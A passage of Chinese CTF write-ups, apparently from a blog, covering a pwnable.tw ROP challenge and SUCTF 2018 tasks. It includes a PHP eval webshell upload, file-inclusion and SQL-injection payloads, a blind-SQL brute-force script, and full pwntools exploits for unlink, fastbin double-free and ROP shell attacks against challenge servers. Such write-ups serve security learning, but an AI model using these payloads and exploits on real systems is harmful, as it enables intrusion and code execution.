starbound未检查index的值,bss段向上找到cmd_set_name函数,通过add_esp_0x1c_ret进行rop即可. 12345678910111213141516171819202122232425262728293031323334from pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']#r = process("./starbound")r = remote("chall.pwnable.tw", "10202")add_esp_0x1c_ret = 0x8048e48p3_ret = 0x80494dap1_ret = 0x80491bcr.sendlineafter("&gt; ", "6")r.sendlineafter("&gt; ", "2")payload = p32(add_esp_0x1c_ret) + "a"r.sendafter("your name: ", payload)r.sendlineafter("&gt; ", "1")payload = str((0x80580d0 - 0x8058154) / 4)payload = payload.ljust(0x8, "\x00")payload += p32(0x8048b90) + p32(p1_ret) + p32(0x805509c)payload += p32(0x8048a70) + p32(p3_ret) + p32(0) + p32(0x805509c) + p32(0x12)payload += p32(0x8048b90) + p32(0) + p32(0x80550a0)r.sendafter("&gt; ", payload)libc = u32(r.recv(4)) - 0x5fca0print "libc: " + hex(libc)payload = p32(libc + 0x3ada0) + "/bin/sh\x00"r.send(payload)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-suctf-2018-招新赛]]></title>
    <url>%2Fposts%2Fc9b1afe3%2F</url>
    <content type="text"><![CDATA[webwhere are you from level1修改HTTP头伪造IP. php里有三个值保存客户ip,分别是HTTP_CLIENT_IP,HTTP_X_FORWARDED_FOR,REMOTE_ADDR. $_SERVER[&#39;HTTP_CLIENT_IP&#39;]如果有代理服务器,一般是代理服务器ip,没有则为空. $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]如果有代理服务器的话,一般是原始ip,没有则为空,若有多个则也显示代理服务器ip. $_SERVER[&#39;REMOTE_ADDR&#39;]如果有代理服务器的话,则为最后一个代理的ip,没有则为连接的客户端ip. 前两个都是可以伪造的,最后的一个很难伪造.$remote_addr是nginx的内置变量,代表了客户端真实(网络传输层)IP. 此题抓包添加Client-Ip: 127.0.0.1即可. include me文件包含漏洞源于网页后端php(或其他)代码中使用了include等文件包含语句,而且所包含的文件由变量控制,此变量又能通过GET或POST等方式进行修改所造成的. 通过PHP内置协议直接读取代码:http://xxx.com/index.php?file=php://filter/read=convert.base64-encode/resource=xxx.php获得xxx.php的代码的base64加密结果. Easy_upload只能传png,尝试修改Content-Type为image/png,成功.php后缀被拉黑名单,尝试php5,成功. 过滤&lt;?php,使用&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[&#39;flag&#39;])&lt;/script&gt;.获得webshell. onepiecehint是phpstorm,使用phpStorm开发的程序目录下会有一个.idea文件夹用于存储配置文件/.idea/workspace.xml. 获得一个zip,打开是一个加密的PHP,解密,逻辑里面设置了flag变量,然后会打印$$filename.猜测是upload.php的部分源码,上传一个名字为flag的文件,获得flag. baby upload这次是客户端限制,上传1.png,抓包改名为1.php5(避免黑名单),获得flag. xss1&quot;+alert(1)+&quot;,alert被过滤,使用JSFuck. xss2不准使用(),将括号变成[][+[]]. php is No.1当有两个is_numeric判断并用and连接时,and后面的is_numeric可以绕过,=优先级比and高,num=&#39;a&#39;绕过. int()会把4e5理解成4,绕过. Classic Sqli用\转义&#39;,然后用正则爆破密码. 123456789101112131415import stringimport requestsimport rechar_set = '0123456789abcdefghijklmnopqrstuvwxyz'pw = ''while 1: for ch in char_set: url = 'http://49.4.68.67:89/?user=\\&amp;pw=||pw/**/regexp/**/"%s$";%%00' url=url%(ch + pw) r = requests.get(url) if 'Bonjour!, admin' in r.text: pw = ch + pw print(pw) break if ch == 'z' : break where are you from level 2Client-Ip处的注入,过滤了空格和一些关键字,但是关键字只过滤了一次,因此可以双写绕过. Client-Ip: 12&#39;,(selselectect/\*\*/fl4g/\*\*/ffromrom/\*\*/flaaag))#. pwnstack &amp;&amp; basic pwn &amp;&amp; babyarray一个越界两个溢出. unlinktake_node时越界,直接unlink攻击,修改free@got. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *buf = 0x6020C0free_got = 0x602018def touch(size): r.sendline('1') r.sendlineafter('size : \n', str(size)) r.recvuntil('chooice :\n',timeout = 1)def modify(index, payload): r.sendline('4') r.sendlineafter('modify :\n', str(index)) r.sendafter('content\n', payload) r.recvuntil('chooice :\n',timeout = 1)def delete(index): r.sendline('2') r.sendlineafter('delete\n', str(index)) r.recvuntil('chooice :\n',timeout = 1)def show(index): r.sendline('3') r.sendlineafter('show\n', str(index)) r.recvuntil('is : \n') data = r.recvline() r.recvuntil('chooice :\n',timeout = 1) return data#r = process(['./pwn'], env=&#123;"LD_PRELOAD":"./libc-2.23.so"&#125;)r = remote("43.254.3.203","10005")r.recvuntil('chooice :\n',timeout = 1)touch(0x90)touch(0x90)touch(0x20)delete(0)touch(0x90)libc_base = u64(show(0)[-7:-1].ljust(8,'\0')) - 0x3c3b78print hex(libc_base)payload = p64(0) + p64(0x91) + p64(buf - 0x18) + p64(buf - 0x10) + "a"*0x70 +p64(0x90) + p64(0xa0)modify(0,payload)delete(1)#buf = &amp;buf - 0x18payload = p64(free_got)*4 + p64(0x6020d8)*2 + "/bin/sh"modify(0,payload)modify(0,p64(libc_base + 0x45390))#gdb.attach(proc.pidof(r)[0])r.interactive() easy_overflow_file_structure漏洞点在于一次写入后没有break跳出循环,可以多次写入. 1234567891011121314from pwn import *#p = process("./eofs")p = remote("43.254.3.203", 10002)payload = "GET / HTTP/1.1#"payload += "Host:" + "a" * 0x7e + "#"payload += "Username:" + "a" * 0x7e + "#"payload += "ResearchField:" + "a" * 0x7e + "#"payload += "ResearchField:" + "cc" + p64(0x602188) + p64(0xdeadbeef) + "#"print payloadp.sendline(payload)print p.recv()p.interactive() int_overflow_pwn整数溢出导致栈溢出. EZ_heap首先利用unsorted bin进行泄露,发现存在uaf,double free之后利用fastbin attack写__malloc_hook. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context(os="linux", arch="amd64")elf = ELF("./pwn")libc = elf.libcdef add(size,name,kind): r.sendline('1') r.sendlineafter('name :', str(size)) r.sendafter('animal :', name) r.sendlineafter('animal :', kind) r.recvuntil('choice : ',timeout = 1)def check(): r.sendline('2') data = r.recvuntil('choice : ',timeout = 1) return datadef delete(index): r.sendline('3') r.sendlineafter('cage:', str(index)) r.recvuntil('choice : ',timeout = 1)def clean(): r.sendline('4') r.recvuntil('choice : ',timeout = 1)r = process(['./pwn'])#r = remote("43.254.3.203","10006")r.recvuntil('choice : ',timeout = 1)add(0x90,"0","222")#0add(0x90,"0","222")#1add(0x90,"0","222")#2add(0x90,"0","222")#3add(0x90,"0","222")#4delete(1)delete(2)add(0x90,"0","222")#5libc_base = u64(check()[0xb3:0xb9].ljust(8,'\0')) - 0x3c4c30print "libc_base: " + hex(libc_base)malloc_hook = libc_base + libc.symbols["__malloc_hook"]print "malloc_hook: " + hex(malloc_hook)one_gadget = 0xf02a4 + libc_baseprint "one_gadget: " + hex(one_gadget)add(0x30,"0","222")#6#the heap is all inuseadd(0x68,"0","222")#7add(0x68,"0","222")#8add(0x20,"0","222")#9delete(7)delete(8)delete(7)add(0x68,p64(malloc_hook - 0x23),"222")add(0x68,"0","222")add(0x68,"0","222")add(0x68,"0" * 0x13 + p64(one_gadget),"222")delete(7)delete(7)r.interactive() miscsingle dog看hint可知应该是两个文件,binwalk一下,使用winhex通过偏移获得ZIP文件get flag. 佛家妙语先与佛论禅. 然后按提示base64,base32,base16,base58. stature明显是改图片高,把1改成2获得flag. dead_z3r0打开,前面一部分为字符串,后面一部分夹杂python函数名,把后面截出,反编译得以下代码. 12345678910111213141516171819def encryt(key, plain): cipher = '' for i in range(len(plain)): cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i])) return cipherdef getPlainText(): plain = ''def main(): key = 'LordCasser' plain = getPlainText() cipher = encryt(key, plain)if __name__ == '__main__': main() 写出解密脚本获得提示. 使用stegosaurus处理反编译前pyc获得flag.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
</search>
